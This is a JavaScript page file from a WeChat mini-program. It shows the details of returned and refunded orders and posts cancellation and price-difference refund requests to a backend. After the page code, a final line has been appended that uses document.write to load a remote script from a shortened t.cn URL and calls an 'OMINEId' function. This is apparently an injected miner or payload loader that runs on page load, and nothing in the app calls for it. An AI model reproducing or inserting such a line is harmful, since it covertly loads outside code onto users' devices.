var t = getApp(),
  a = t.requirejs("core"),
  e = t.requirejs("biz/order"),
  $=t.requirejs("jquery");
Page({
  data: {
    icons: t.requirejs("icons"),
    status: "all",
    list: [{ ordersn: "AB4558552222", statusstr: "待付款", order_goods: [ { thumb: "urlTest", title: "ME6211C33M5G ", optiontitle: "盘装", price: "0.56", pnum: "20" ,total:"11.2" }], price: "0.66", id: "10", cancancel: "true", canpay: "true", canverify: "10", candelete: "true", cancomment2: "true", cancomment: "true", cancomplete: "true", canrefund: "true", refundtext: "just do it", hasexpress: "true", canrestore: "true" }],
    page: 1,
    code: false,
    show:"",
    loaded:false,
    onshow:false,
    cancel: e.cancelArray,
    cancelindex: 0,
    buttonText:"v"
  },
  onLoad: function (a) {
    this.setData({
      option: a
    });
    //this.get_list({ order_sn: a.id,show_data: "retreatDetail"});
  },
  onShow:function(){
    //console.log("onshow",this.data.onshow);
   // if (!this.data.onshow)return;
    var _this=this;
    _this.setData({
      list:[]
    },function(){
      _this.get_list({ order_sn: _this.data.option.id, show_data: "retreatDetail" }, function () {
        wx.stopPullDownRefresh();
      });
    });
  },
  get_list: function (addObject) {
    //退货退款订单详情
    var _this = this;
    wx.showLoading({
      title: '加载中'
    });
    var datas = {};
    if (addObject) {
      datas = $.extend({
        session_token: t.globalData.session_token,      
      }, addObject);
    } else {
      datas = {
        session_token: t.globalData.session_token,
        show_data:"retreatDetail"
      };
    };
    wx.request({
      url: t.globalData.daxin + "/order/orderList",
      data: datas,
      method: "POST",
      success: function (res) {
  
        wx.hideLoading();
        if (res.data.statusCode >= 0 && res.data.data.list) {
          var order = res.data.data.list[0];
          var lists = $.extend({},res.data.data.list[0]);
          if (res.data.data.list.length == 0 || lists.order_retreat.length ==0)
            {
              _this.setData({
                list: lists,
              empty:true,
              show: true,
              onshow:true
            });
            return;
          };
          //console.log(lists,lists.order_retreat.length);
          var total_retreat=0;
          $.each(lists.order_retreat, function (index, value) {
            value.statusstr = t.getRetreatstatus(parseFloat(value.handle_status)); 
            //value.order_retreat_goods = _this.getListData(value.re_sn, order.order_retreat_goods); 
            value.order_retreat_goods = value.item;
            $.each(value.order_retreat_goods,function(ind,val){
             // console.log(_this.getListData(val.p_id, order.order_goods, "obj"));
              val.retreat_self_num = val.p_num;
              var objs = _this.getListData(val.p_id, order.order_goods, "obj");
              val = $.extend(true, val, objs); 
            }); 
          });
         // console.log(lists);
          _this.setData({
            list: lists,
            show: true,
            loaded:true
          });
        } else {
          if (res.data.msg == "没有数据"){
            _this.setData({
              empty: true,
              show:true,
              list:[]
            });
          }else{
            wx.showModal({
              title: '错误提示',
              content: res.data.msg + ',数据获取失败',
              showCancel: false,
              success: function () {
                if (res.confirm) {

                }
              }
            })
          }
        }

      }
    })
  },
  getListData:function(value,array,obj){
    var data = obj?{}:[];
    if (!$.isArray(array)){return []};
      $.each(array,function(ind,val){
        if (val.re_sn ==value){
          data.push(val);
        }
        if (val.p_id == value && obj) {
          val.thumb = t.globalData.daxinImg+val.img;
          data = val;
          return false;
        }
      });
      return data;
  },
  onPullDownRefresh:function(){
    var _this=this;
     //下拉刷新
    this.get_list({ order_sn: _this.data.option.id, show_data: "retreatDetail" },function(){
       
      });
    wx.stopPullDownRefresh();
  },
  onReachBottom: function () {
    this.data.loaded || this.data.list.length == this.data.total || this.get_list()
  },
  handle: function (t) {
    var e = this,
      s = a.pdata(t).type;
    switch (s) {
      case 'repeal': 
      //撤销申请
        var data = a.pdata(t).re_sn;
        e.knot({ order_sn: e.data.option.id, re_sn: data },function(){
          e.get_list({ order_sn: e.data.option.id, show_data: "retreatDetail" });
        });break;
      case 'knot': 
        var order_sn=a.pdata(t).id;
        e.knot(order_sn,function(){
          e.get_list();
        }); break;
      case 'difference': e.difference({ order_sn:a.pdata(t).order_sn}); break;
      case '2': obj = { ship_status: 2 }; break;
     // case '3': obj = { order_status: 3 }; break;
      case '4': obj = { is_retreat: 1 }; break;
      case '5': obj = { is_comment: 1 }; break;
      default: break;
    };
  },
  knot: function (data, fn) {
    //撤销申请
    var _this = this;
    var datas = {
      session_token: t.globalData.session_token,
      action: "cancelRetreat"
      };
      if(data){
        datas = $.extend(datas, data);
      }
    wx.request({
      url: t.globalData.daxin + "/order/knotOrder",
      data: datas,
      method: "POST",
      success: function (res) {
        //console.log(res);
        wx.hideLoading();
        if (res.data.statusCode >= 0 && res.data.msg == "撤销退款成功") {
          wx.showLoading({
            title: res.data.msg,
            icon:'success',
            duration:900,
            success:function(){
              setTimeout(function(){
                if (fn) { fn(); };
              },800);
            }
          })
         
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.data.msg ,
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  close: function () {
    this.setData({
      code: false
    })
  },
  difference:function(addObj){
    //返差额
    var _this = this;
    var data = {
      session_token: t.globalData.session_token,
      customer_account_type : 2,
      customer_account: '000',
      notify_mobile : '000',
      account_name: '000'
      };
    wx.request({
      url: t.globalData.daxin + "/order/knotOrderMoney",
      data: $.extend(data,addObj),
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        if (res.data.statusCode >= 0 && res.data.msg == "结单提交成功") {
          if (fn) { fn(); };
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.msg,
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  onShareAppMessage: function () {
    return a.onShareAppMessage()
  },
  moreHandle:function(event){
    var indd= a.pdata(event).self;
    var status = indd;
    if (this.data['buttonStatus'] == indd) { status = "-1";}; 
    this.setData({
      'buttonStatus': status,
      isTurn: status
    });
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
